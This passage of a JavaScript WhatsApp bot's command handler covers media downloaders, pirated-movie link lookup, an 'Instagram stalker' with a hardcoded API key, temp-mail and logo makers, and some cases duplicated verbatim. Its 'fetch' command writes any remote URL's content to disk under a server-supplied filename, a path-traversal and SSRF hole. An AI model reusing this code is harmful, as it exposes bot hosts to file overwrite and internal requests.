                                caption: `🎬 *Here is your video:*\n🎥 *${videoTitle}*`
                            }, { quoted: m });
                        } else {
                            replyphistar("❌ Failed to fetch the video. Please try again.");
                        }
                    }
                } catch (err) {
                    console.error(`Error downloading ${choice}:`, err);
                    replyphistar(`❌ Error downloading ${choice}. Please try again.`);
                }
            } else {
                replyphistar("❌ Invalid choice. Please reply with 'audio' or 'video'.");
            }
        });

        collector.on('end', collected => {
            if (collected.size === 0) {
                replyphistar("⌛ Timeout - You didn't choose an option. Please try the command again.");
            }
        });

    } catch (err) {
        console.error("Error in song command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}
// Text to PDF Command
case 'text2pdf': {
    if (!text) return replyphistar(`❌ Please provide text to convert into a PDF.\nExample: ${prefix + command} Hello, this is my PDF file.`);

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/tools/pdf?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const { success, download } = response.data;

        if (success && download) {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download },
                mimetype: 'application/pdf',
                fileName: 'Converted_Text.pdf',
                caption: `✅ *PDF Generated Successfully!*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʜ✦ꜱᴛᴀʀ ʙᴏᴛ`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate PDF. Please try again later.`);
        }
    } catch (error) {
        console.error('Error generating PDF:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.\nError: ${error.message}`);
    }
    break;
}
case 'transcribe': {
    if (!m.quoted) {
        return replyphistar(`🔊 Reply to a voice message to transcribe it.`);
    }

    try {
        // PROPER voice message detection for baileys/WhatsApp Business API
        const quotedMsg = m.quoted.message;
        
        // Voice messages in WhatsApp Business API have this specific structure:
        const isVoiceMessage = (
            quotedMsg?.audioMessage &&          // Must have audioMessage object
            quotedMsg.audioMessage.ptt === true // MUST have ptt: true for voice notes
        );

        // Debug: Log the actual structure to understand what we're dealing with
        console.log('Quoted message keys:', Object.keys(quotedMsg || {}));
        if (quotedMsg?.audioMessage) {
            console.log('Audio message props:', Object.keys(quotedMsg.audioMessage));
            console.log('PTT value:', quotedMsg.audioMessage.ptt);
            console.log('Mimetype:', quotedMsg.audioMessage.mimetype);
        }

        if (!isVoiceMessage) {
            // Provide more specific feedback
            const detectedType = Object.keys(quotedMsg || {})[0] || 'unknown';
            return replyphistar(`❌ Detected message type: *${detectedType}*\n\nPlease reply to a **voice note** (not regular audio or other message type).\n\nVoice notes have the microphone icon 🎤 while regular audio files have the music icon 🎵`);
        }

        // Download and resend the voice note
        const audioBuffer = await downloadMediaMessage(m.quoted, 'buffer', {});
        
        await PhistarBotInc.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            contextInfo: {
                mentionedJid: [m.sender]
            }
        }, { quoted: m });
        
        replyphistar(`✅ Voice note resent. Check for WhatsApp's transcription below the message.`);

    } catch (error) {
        console.error('Transcription error:', error);
        replyphistar(`❌ Error: ${error.message}`);
    }
    break;
}
case 'playdoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your audio file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *Audio File Found* 🎶\n\n` +
                     `🎵 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *audio file* for you...`
        }, { quoted: m });

        // Step 3: Fetch audio document download link
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { download_url } = audioResponse.data.result;

            // Step 4: Send the audio file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${videoTitle}.mp3`,
                caption: `📁 *Audio File:* ${videoTitle}.mp3`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the audio file. Try again.");
        }

    } catch (err) {
        console.error("Error in playdoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'videodoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your video file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎬 *Video File Found* 🎬\n\n` +
                     `🎥 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *video file* for you...`
        }, { quoted: m });

        // Step 3: Fetch video document download link
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { download_url } = videoResponse.data.result;

            // Step 4: Send the video file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'video/mp4',
                fileName: `${videoTitle}.mp4`,
                caption: `📁 *Video File:* ${videoTitle}.mp4`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video file. Try again.");
        }

    } catch (err) {
        console.error("Error in videodoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}
case 'playdoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your audio file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *Audio File Found* 🎶\n\n` +
                     `🎵 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *audio file* for you...`
        }, { quoted: m });

        // Step 3: Fetch audio document download link
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { download_url } = audioResponse.data.result;

            // Step 4: Send the audio file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${videoTitle}.mp3`,
                caption: `📁 *Audio File:* ${videoTitle}.mp3`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the audio file. Try again.");
        }

    } catch (err) {
        console.error("Error in playdoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'videodoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your video file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎬 *Video File Found* 🎬\n\n` +
                     `🎥 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *video file* for you...`
        }, { quoted: m });

        // Step 3: Fetch video document download link
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { download_url } = videoResponse.data.result;

            // Step 4: Send the video file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'video/mp4',
                fileName: `${videoTitle}.mp4`,
                caption: `📁 *Video File:* ${videoTitle}.mp4`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video file. Try again.");
        }

    } catch (err) {
        console.error("Error in videodoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}  
  case 'movie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <movie-name>`);

    try {
        await replyphistar(`🔍 *Searching for movies...*\nPlease wait.`);
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || result.movies.length === 0) {
            return replyphistar(`❌ No movies found for "${text}". Please try again.`);
        }

        // Save search results temporarily
        global.movieSearchResults = result.movies;

        let movieList = `🎥 *Search Results for "${text}":*\n\n`;
        result.movies.forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n   🌟 ${movie.imdb} | 📅 ${movie.year}\n   🔗 [Details](${movie.link})\n\n`;
        });
        movieList += `\nTo select a movie, use the command:\n*.selectmovie <number>* (e.g., *.selectmovie 1*).`;

        await replyphistar(movieList);
    } catch (error) {
        console.error('Error searching for movies:', error.message);
        replyphistar(`❌ An error occurred while searching for movies. Please try again.`);
    }
    break;
}
case 'selectmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nSelect a movie from the list.`);
    if (!global.movieSearchResults || global.movieSearchResults.length === 0) {
        return replyphistar(`❌ No movies found. Please use the *movie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieSearchResults.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid movie number from the list.`);
    }

    const selectedMovie = global.movieSearchResults[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await replyphistar(`🔍 *Fetching movie details...*\nPlease wait.`);
        const response = await axios.get(movieDetailsUrl);

        const { status, result } = response.data;
        if (!status || !result) {
            return replyphistar(`❌ Failed to fetch movie details. Please try again.`);
        }

        const movie = result.data;
        global.movieLinks = movie.dl_links;
        global.selectedMovieTitle = movie.title; // Save the movie title globally for use in the download command

        let movieInfo = `🎬 *${movie.title}*\n\n`;
        movieInfo += `📅 *Release Date:* ${movie.date}\n`;
        movieInfo += `🌍 *Country:* ${movie.country}\n`;
        movieInfo += `⏳ *Runtime:* ${movie.runtime}\n`;
        movieInfo += `⭐ *IMDb Rating:* ${movie.imdbRate}/10 (${movie.imdbVoteCount} votes)\n`;
        movieInfo += `🎥 *TMDb Rating:* ${movie.tmdbRate}/10\n\n`;
        movieInfo += `💾 *Available Qualities:*\n`;
        movie.dl_links.forEach((link, index) => {
            movieInfo += `  ${index + 1}. *${link.quality}* - *${link.size}*\n`;
        });
        movieInfo += `\nTo download, use the command:\n*.secmovie <number>* (e.g., *.secmovie 2*).`;

        await PhistarBotInc.sendMessage(m.chat, { image: { url: movie.image }, caption: movieInfo }, { quoted: m });
    } catch (error) {
        console.error('Error fetching movie details:', error.message);
        replyphistar(`❌ An error occurred while fetching movie details. Please try again.`);
    }
    break;
}
case 'secmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nChoose a quality number from the list provided earlier.`);
    if (!global.movieLinks || global.movieLinks.length === 0) {
        return replyphistar(`❌ No movie details found. Please use the *selectmovie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieLinks.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid quality number from the list.`);
    }

    const selectedLink = global.movieLinks[selectedIndex]?.link;
    if (!selectedLink) {
        return replyphistar(`❌ Could not find the selected quality. Please try again.`);
    }

    try {
        const movieTitle = global.selectedMovieTitle || 'Movie'; // Use the saved movie title
        const downloadMessage = `🎥 *Movie Download Link*\n\n*Title:* ${movieTitle}\n\n🔗 [Download Here](${selectedLink})`;

        await PhistarBotInc.sendMessage(m.chat, { text: downloadMessage }, { quoted: m });
    } catch (error) {
        console.error('Error sending download link:', error.message);
        replyphistar(`❌ An error occurred while sending the download link. Please try again.`);
    }
    break;
}
case 'instagramstalk': case 'igstalk': {
    if (!text) return replyphistar('Please provide a username.\nExample: .igstalk davido');
    
    const username = text.trim(); // Extract the username
    const isLowercase = /^[a-z0-9_.]+$/.test(username); // Validate for lowercase and valid Instagram usernames

    // Reject input if it contains uppercase letters or invalid characters
    if (!isLowercase) {
        return replyphistar('Please use lowercase letters only for the username.\nExample: .igstalk davido');
    }

    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/stalk/igstalkv2?apikey=${apiKey}&username=${username}`;

        // Fetch Instagram details
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const { profile, username, fullName, bio, posts, followers, following } = response.data.result;

            // Construct the reply message
            const message = `*Instagram Stalker*\n\n` +
                            `🔹 *Username:* ${username}\n` +
                            `🔹 *Full Name:* ${fullName}\n` +
                            `🔹 *Bio:* ${bio}\n` +
                            `🔹 *Posts:* ${posts}\n` +
                            `🔹 *Followers:* ${followers}\n` +
                            `🔹 *Following:* ${following}`;

            // Send the response with profile picture
            await PhistarBotInc.sendMessage(m.chat, { 
                caption: message, 
                image: { url: profile }
            }, { quoted: m });
        } else {
            // Handle unsuccessful response
            replyphistar(`Failed to fetch details for username "${username}".\nReason: ${response.data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        // Handle specific errors without logging to console
        if (error.response) {
            replyphistar(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('No response received from the API. Please try again later.');
        } else {
            replyphistar(`An error occurred: ${error.message}`);
        }
    }
    break;
}
case 'pickupline': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replyphistar(`💘 *Pickup Line:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replyphistar('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replyphistar(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('❌ No response received from the API. Please try again later.');
        } else {
            replyphistar(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}

case 'rizz': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replyphistar(`🔥 *RIZZ:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replyphistar('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replyphistar(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('❌ No response received from the API. Please try again later.');
        } else {
            replyphistar(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}
case "tempmail":
case "tmpmail":
case "newmail": {
    if (!tempMailData[m.sender]) {
        try {
            // Generate a random email using 1SecMail API
            const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
            const data = response.data[0];

            if (!data) {
                return replyphistar("❌ Failed to generate a temporary email. Please try again.");
            }

            // Save the generated email for the user
            tempMailData[m.sender] = { email: data };
            replyphistar(`✅ *Temporary Email Created:*\n\n📧 Email: ${data}\n\nUse *${prefix}checkmail* to check your inbox.\nUse *${prefix}delmail* to delete your email.`);
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while creating a temporary email. Please try again.");
        }
    } else {
        replyphistar(`📧 *You already have a temporary email:*\n\n${tempMailData[m.sender].email}\n\nUse *${prefix}checkmail* to check your inbox.`);
    }
    break;
}

// **Check Emails**
case "checkmails":
case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail) {
        return replyphistar(`❌ You don't have a temporary email. Use *${prefix}tempmail* to create one.`);
    }

    try {
        // Get the list of emails from the inbox using 1SecMail API
        const [login, domain] = userMail.email.split('@');
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        
        const inbox = response.data;
        if (!inbox || inbox.length === 0) {
            return replyphistar(`📭 *No mails received yet!*\nUse *${prefix}delmail* to delete mail.`);
        }

        let messageList = "📩 *Your Emails:*\n\n";
        for (const email of inbox) {
            messageList += `📧 *From:* ${email.from}\n🗓️ *Date:* ${email.date}\n✉️ *Subject:* ${email.subject}\n🔑 *ID:* ${email.id}\n\n`;
        }
        replyphistar(messageList.trim());
    } catch (error) {
        console.error(error);
        replyphistar("❌ An error occurred while checking emails. Please try again.");
    }
    break;
}

// **Delete Temporary Email**
case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    const userMail = tempMailData[m.sender];
    if (userMail) {
        try {
            // Delete the temporary email using 1SecMail API
            const [login, domain] = userMail.email.split('@');
            const response = await axios.get(`https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${login}&domain=${domain}`);
            
            if (response.data.result === 'success') {
                delete tempMailData[m.sender]; // Remove from local storage
                replyphistar("✅ Your temporary email has been deleted.");
            } else {
                replyphistar("❌ Failed to delete your temporary email. Please try again.");
            }
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while deleting your temporary email. Please try again.");
        }
    } else {
        replyphistar("❌ You don't have a temporary email to delete.");
    }
    break;
}
case 'advancedglow': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/advanced-glow-effects-74.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'typographytext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'glitchtext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'writetext': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/write-text-on-wet-glass-online-589.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'elegant': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-elegant-rotation-logo-online-586.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'pubg': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-pubg-style-glitch-video-avatar-554.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'tiger': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-digital-tiger-logo-video-effect-723.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'shutdown':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyphistar(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyphistar(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyphistar(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyphistar(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyphistar(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyphistar(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyphistar(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyphistar(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyphistar(mess.owner)
               if (args.length < 1) return replyphistar('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyphistar(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyphistar(`${command} is disabled`)
               }
            }
            break
case 'animevideo':
case 'amv': {
    if (!text) return replyphistar('Enter the number\nExample: .animevideo 1');

    async function animeVideo() {
        const url = 'https://shortstatusvideos.com/anime-video-status-download/';
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);
        const videos = [];
        $('a.mks_button.mks_button_small.squared').each((index, element) => {
            const href = $(element).attr('href');
            const title = $(element).closest('p').prevAll('p').find('strong').text();
            videos.push({
                title,
                source: href
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    async function animeVideo2() {
        const url = 'https://mobstatus.com/anime-whatsapp-status-video/';
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);

        const videos = [];
        const title = $('strong').text();

        $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
            const href = $(element).attr('href');
            videos.push({
                title,
                source: href
            });
        });

        const randomIndex = Math.floor(Math.random() * videos.length);
        const randomVideo = videos[randomIndex];

        return randomVideo;
    }

    if (text == '1') {
        try {
            let resl = await animeVideo();
            let cap = `Here's the video`;
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: resl.source },
                caption: cap
            }, { quoted: m });
        } catch (e) {
            await replyphistar('Error occurred while fetching the video.');
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2();
            let cap = `Here's the video`;
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: resl.source },
                caption: cap
            }, { quoted: m });
        } catch (e) {
            await replyphistar('Error occurred while fetching the video.');
        }
    }
}
break;

case 'creatememe': {
    const memeImageUrl = args[0];
    const topText = args[1];
    const bottomText = args[2];
    if (!memeImageUrl || !topText || !bottomText) return replyphistar('Usage: .creatememe [image URL] [top text] [bottom text]');

    try {
        const response = await axios.get(`https://api.memegen.link/images/custom/${encodeURI(topText)}/${encodeURI(bottomText)}.jpg?background=${memeImageUrl}`, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'binary');
        await PhistarBotInc.sendMessage(m.chat, {
            image: buffer,
            caption: 'Here is your meme!'
        }, { quoted: m });
    } catch (error) {
        console.error('Error generating meme:', error.message);
        replyphistar('Could not create meme. Please check the image URL and try again.');
    }
    break;
}
case 'fetch': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} <api_or_download_link>`);

    try {
        // Notify the user that the bot is processing the request
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📡`, key: m.key } });

        // Fetch the URL and handle file types
        const response = await axios.get(text, {
            responseType: 'arraybuffer', // Fetch data as a raw buffer
        });

        const contentType = response.headers['content-type'];
        const contentDisposition = response.headers['content-disposition'] || '';
        const extension = contentType.split('/')[1];

        // Generate a temporary filename if no filename is provided in the response headers
        const fs = require('fs');
        const path = require('path');
        const fileName = contentDisposition.match(/filename="([^"]+)"/)?.[1] || `tempfile.${extension}`;
        const tempFilePath = path.resolve(__dirname, fileName);
        fs.writeFileSync(tempFilePath, response.data);

        // Send the file to the user based on its content type
        if (contentType.startsWith('image/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: tempFilePath },
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('video/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: tempFilePath },
                mimetype: contentType,
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('audio/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
